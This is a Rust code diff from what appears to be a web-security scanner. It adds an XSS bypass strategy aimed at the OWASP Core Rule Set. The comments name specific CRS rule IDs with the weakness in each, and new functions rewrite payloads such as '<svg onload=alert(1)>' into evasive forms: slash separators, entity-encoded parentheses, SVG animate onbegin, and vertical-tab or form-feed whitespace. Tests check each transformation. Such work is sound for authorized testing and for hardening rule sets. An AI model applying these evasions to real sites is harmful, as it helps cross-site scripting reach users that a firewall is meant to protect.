@@ -24,6 +24,19 @@ pub enum MutationType {
     MixedHtmlEntities,
     /// Alternating case for HTML tags: `<ScRiPt>`
     CaseAlternation,
+    // ── CRS-targeting mutations ─────────────────────────────────────
+    /// Use `/` instead of space between tag and attributes: `<svg/onload=alert(1)>`
+    /// Bypasses CRS 941160 regex that expects whitespace before attributes.
+    SlashSeparator,
+    /// Replace parentheses with HTML entities: `alert&#40;1&#41;`
+    /// Bypasses CRS 941370 JS function call detection.
+    HtmlEntityParens,
+    /// SVG animate/set element execution: `<svg><animate onbegin=alert(1) attributeName=x>`
+    /// Bypasses CRS 941110 tag denylist which may not include SVG animation elements.
+    SvgAnimateExec,
+    /// Exotic whitespace chars (vertical tab 0x0B, form feed 0x0C) between tag and attrs.
+    /// Bypasses CRS 941320 tag handler regex that only checks \\s (space/tab/newline).
+    ExoticWhitespace,
 }
 
 /// A bypass strategy composed of extra encoders and payload mutations.
@@ -87,6 +100,34 @@ pub fn get_bypass_strategy(waf: &WafType) -> BypassStrategy {
                 MutationType::CaseAlternation,
                 MutationType::BacktickParens,
                 MutationType::ConstructorChain,
+            ],
+            extra_delay_hint_ms: 0,
+        },
+        // OWASP CRS bypass: tuned for CRS rules 941100-941380.
+        // CRS uses libinjection + regex patterns for XSS detection.
+        // Key weaknesses:
+        // - Slash-separated tag attributes bypass 941160 regex
+        // - SVG animate/set elements bypass 941110 tag denylist
+        // - HTML entity-encoded parens bypass 941370 JS function detection
+        // - Exotic whitespace (0x0B, 0x0C) bypass 941320 tag handler
+        // - Constructor chain and backtick bypass keyword-based rules
+        WafType::OwaspCrs => BypassStrategy {
+            extra_encoders: vec![
+                "unicode".into(),
+                "4url".into(),
+                "2url".into(),
+                "htmlpad".into(),
+                "zwsp".into(),
+            ],
+            mutations: vec![
+                MutationType::SlashSeparator,
+                MutationType::SvgAnimateExec,
+                MutationType::HtmlEntityParens,
+                MutationType::ExoticWhitespace,
+                MutationType::BacktickParens,
+                MutationType::ConstructorChain,
+                MutationType::CaseAlternation,
+                MutationType::HtmlCommentSplit,
             ],
             extra_delay_hint_ms: 0,
         },
@@ -249,6 +290,10 @@ fn apply_single_mutation(payload: &str, mutation: &MutationType) -> String {
         MutationType::UnicodeJsEscape => unicode_js_escape(payload),
         MutationType::MixedHtmlEntities => mixed_html_entities(payload),
         MutationType::CaseAlternation => case_alternate(payload),
+        MutationType::SlashSeparator => slash_separator(payload),
+        MutationType::HtmlEntityParens => html_entity_parens(payload),
+        MutationType::SvgAnimateExec => svg_animate_exec(payload),
+        MutationType::ExoticWhitespace => exotic_whitespace(payload),
     }
 }
 
@@ -282,7 +327,7 @@ fn html_comment_split(payload: &str) -> String {
     result
 }
 
-/// Insert tabs/newlines between HTML tags and their attributes.
+/// Insert tabs/newlines/carriage returns between HTML tags and their attributes.
 /// `<img src=x` → `<img\tsrc=x`
 fn whitespace_mutation(payload: &str) -> String {
     let tag_attr_patterns = [
@@ -291,9 +336,15 @@ fn whitespace_mutation(payload: &str) -> String {
         ("<IMG SRC", "<IMG\tSRC"),
         ("<svg onload", "<svg\nonload"),
         ("<SVG ONLOAD", "<SVG\nONLOAD"),
+        ("<SVG onload", "<SVG\nonload"),
+        ("<sVg onload", "<sVg\nonload"),
         ("<svg/onload", "<svg\tonload"),
         ("<body onload", "<body\nonload"),
         ("<input onfocus", "<input\tonfocus"),
+        ("<details open", "<details\ropen"),
+        ("<marquee onstart", "<marquee\tonstart"),
+        ("<video src", "<video\tsrc"),
+        ("<audio src", "<audio\rsrc"),
     ];
 
     let mut result = payload.to_string();
@@ -432,6 +483,115 @@ fn mixed_html_entities(payload: &str) -> String {
         }
     }
     result
+}
+
+// ── CRS-targeting mutation implementations ──────────────────────
+
+/// Replace space between HTML tag and attribute with `/`.
+/// `<svg onload=alert(1)>` → `<svg/onload=alert(1)>`
+/// `<img src=x onerror=alert(1)>` → `<img/src=x onerror=alert(1)>`
+fn slash_separator(payload: &str) -> String {
+    let patterns = [
+        ("<svg onload", "<svg/onload"),
+        ("<SVG ONLOAD", "<SVG/ONLOAD"),
+        ("<SVG onload", "<SVG/onload"),
+        ("<img src", "<img/src"),
+        ("<IMG SRC", "<IMG/SRC"),
+        ("<IMG src", "<IMG/src"),
+        ("<details open", "<details/open"),
+        ("<input onfocus", "<input/onfocus"),
+        ("<body onload", "<body/onload"),
+        ("<marquee onstart", "<marquee/onstart"),
+        ("<video src", "<video/src"),
+        ("<audio src", "<audio/src"),
+    ];
+
+    let mut result = payload.to_string();
+    for (from, to) in &patterns {
+        if result.contains(from) {
+            result = result.replacen(from, to, 1);
+            break;
+        }
+    }
+    result
+}
+
+/// Replace parentheses with HTML entities to bypass JS function call detection.
+/// `alert(1)` → `alert&#40;1&#41;`
+/// Also supports `&lpar;`/`&rpar;` named entities.
+fn html_entity_parens(payload: &str) -> String {
+    // Replace all occurrences of ( and ) with HTML decimal entities
+    let mut result = payload.to_string();
+    // Use &#40; for ( and &#41; for )
+    if result.contains('(') || result.contains(')') {
+        result = result.replace('(', "&#40;").replace(')', "&#41;");
+    }
+    result
+}
+
+/// Generate SVG animate element-based execution payload.
+/// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
+/// For other payloads containing event handlers, wrap in SVG animate.
+fn svg_animate_exec(payload: &str) -> String {
+    // Transform svg onload variants to svg animate onbegin
+    for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
+        if let Some(rest) = payload.strip_prefix(prefix)
+            && let Some(handler_end) = rest.find('>')
+        {
+            let handler = &rest[..handler_end];
+            let clean_handler = handler.split_whitespace().next().unwrap_or(handler);
+            return format!(
+                "<svg><animate onbegin={} attributeName=x dur=1s>",
+                clean_handler
+            );
+        }
+    }
+    // Also transform img onerror to svg animate
+    if payload.contains("<img") || payload.contains("<IMG") || payload.contains("<im") {
+        for prefix in &["onerror=", "ONERROR="] {
+            if let Some(idx) = payload.find(prefix) {
+                let after = &payload[idx + prefix.len()..];
+                let handler_end = after
+                    .find([' ', '>', '\t', '\n'])
+                    .unwrap_or(after.len());
+                let handler = &after[..handler_end];
+                return format!(
+                    "<svg><animate onbegin={} attributeName=x dur=1s>",
+                    handler
+                );
+            }
+        }
+    }
+    payload.to_string()
+}
+
+/// Insert exotic whitespace characters (vertical tab, form feed) between tag and attributes.
+/// `<img src=x onerror=alert(1)>` → `<img\x0Bsrc=x\x0Conerror=alert(1)>`
+fn exotic_whitespace(payload: &str) -> String {
+    // Patterns: (from, tag, exotic_char, attr)
+    // Using VT=\x0B and FF=\x0C between tag and attributes
+    const PATTERNS: &[(&str, &str, char, &str)] = &[
+        ("<img src",        "<img",     '\x0B', "src"),
+        ("<IMG src",        "<IMG",     '\x0B', "src"),
+        ("<IMG SRC",        "<IMG",     '\x0B', "SRC"),
+        ("<svg onload",     "<svg",     '\x0C', "onload"),
+        ("<SVG ONLOAD",     "<SVG",     '\x0C', "ONLOAD"),
+        ("<svg/onload",     "<svg",     '\x0B', "onload"),
+        ("<body onload",    "<body",    '\x0C', "onload"),
+        ("<input onfocus",  "<input",   '\x0B', "onfocus"),
+        ("<details open",   "<details", '\x0C', "open"),
+        ("<marquee onstart","<marquee", '\x0B', "onstart"),
+    ];
+
+    for &(from, tag, ws, attr) in PATTERNS {
+        if payload.contains(from) {
+            let mut result = payload.to_string();
+            let replacement = format!("{}{}{}", tag, ws, attr);
+            result = result.replacen(from, &replacement, 1);
+            return result;
+        }
+    }
+    payload.to_string()
 }
 
 /// Alternate the case of HTML tag characters.
@@ -582,15 +742,81 @@ mod tests {
     fn test_every_waf_has_strategy() {
         let waf_types = vec![
             WafType::Cloudflare, WafType::AwsWaf, WafType::Akamai,
-            WafType::Imperva, WafType::ModSecurity, WafType::Sucuri,
-            WafType::F5BigIp, WafType::Barracuda, WafType::FortiWeb,
-            WafType::AzureWaf, WafType::CloudArmor, WafType::Fastly,
-            WafType::Wordfence, WafType::Unknown("test".to_string()),
+            WafType::Imperva, WafType::ModSecurity, WafType::OwaspCrs,
+            WafType::Sucuri, WafType::F5BigIp, WafType::Barracuda,
+            WafType::FortiWeb, WafType::AzureWaf, WafType::CloudArmor,
+            WafType::Fastly, WafType::Wordfence,
+            WafType::Unknown("test".to_string()),
         ];
         for waf in &waf_types {
             let strategy = get_bypass_strategy(waf);
             assert!(!strategy.extra_encoders.is_empty(), "WAF {:?} has no extra encoders", waf);
             assert!(!strategy.mutations.is_empty(), "WAF {:?} has no mutations", waf);
         }
+    }
+
+    #[test]
+    fn test_owasp_crs_strategy() {
+        let strategy = get_bypass_strategy(&WafType::OwaspCrs);
+        // CRS strategy should include all CRS-targeting mutations
+        assert!(strategy.mutations.contains(&MutationType::SlashSeparator));
+        assert!(strategy.mutations.contains(&MutationType::SvgAnimateExec));
+        assert!(strategy.mutations.contains(&MutationType::HtmlEntityParens));
+        assert!(strategy.mutations.contains(&MutationType::ExoticWhitespace));
+        // Should include unicode and multi-url encoding
+        assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
+        assert!(strategy.extra_encoders.contains(&"4url".to_string()));
+    }
+
+    #[test]
+    fn test_slash_separator() {
+        assert_eq!(
+            slash_separator("<svg onload=alert(1)>"),
+            "<svg/onload=alert(1)>"
+        );
+        assert_eq!(
+            slash_separator("<img src=x onerror=alert(1)>"),
+            "<img/src=x onerror=alert(1)>"
+        );
+    }
+
+    #[test]
+    fn test_html_entity_parens() {
+        assert_eq!(
+            html_entity_parens("alert(1)"),
+            "alert&#40;1&#41;"
+        );
+        assert_eq!(
+            html_entity_parens("<img src=x onerror=alert(1)>"),
+            "<img src=x onerror=alert&#40;1&#41;>"
+        );
+    }
+
+    #[test]
+    fn test_svg_animate_exec() {
+        let result = svg_animate_exec("<svg onload=alert(1)>");
+        assert!(result.contains("<svg><animate"));
+        assert!(result.contains("onbegin=alert(1)"));
+        assert!(result.contains("attributeName=x"));
+    }
+
+    #[test]
+    fn test_svg_animate_exec_from_img() {
+        let result = svg_animate_exec("<img src=x onerror=alert(1)>");
+        assert!(result.contains("<svg><animate"));
+        assert!(result.contains("onbegin=alert(1)"));
+    }
+
+    #[test]
+    fn test_exotic_whitespace() {
+        let result = exotic_whitespace("<img src=x onerror=alert(1)>");
+        assert!(result.contains('\x0B') || result.contains('\x0C'));
+        assert!(!result.contains("<img src"));
+    }
+
+    #[test]
+    fn test_exotic_whitespace_svg() {
+        let result = exotic_whitespace("<svg onload=alert(1)>");
+        assert!(result.contains('\x0B') || result.contains('\x0C'));
     }
 }
